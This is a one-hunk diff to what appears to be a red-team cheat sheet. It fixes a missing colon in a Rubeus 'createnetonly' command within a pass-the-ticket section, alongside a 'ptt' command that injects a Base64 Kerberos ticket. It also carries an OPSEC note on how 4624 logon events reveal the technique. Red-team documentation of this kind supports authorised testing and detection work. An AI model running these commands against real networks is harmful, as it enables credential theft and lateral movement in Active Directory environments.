@@ -283,7 +283,7 @@ steal_token <PID>
 #### Pass the ticket
 - OPSEC: By default, Rubeus will use a random username, domain and password with CreateProcessWithLogonW, which will appear in the associated 4624 logon event.  The "Suspicious Logon Events" saved search will show 4624's where the TargetOutboundDomainName is not an expected value.
 ```
-execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain<DOMAIN> /username:<USER> /password:FakePass123
+execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<DOMAIN> /username:<USER> /password:FakePass123
 
 execute-assembly Rubeus.exe ptt /luid:<LUID FROM PREVIOUS COMMAND> /ticket:<BASE64 TICKET>
 
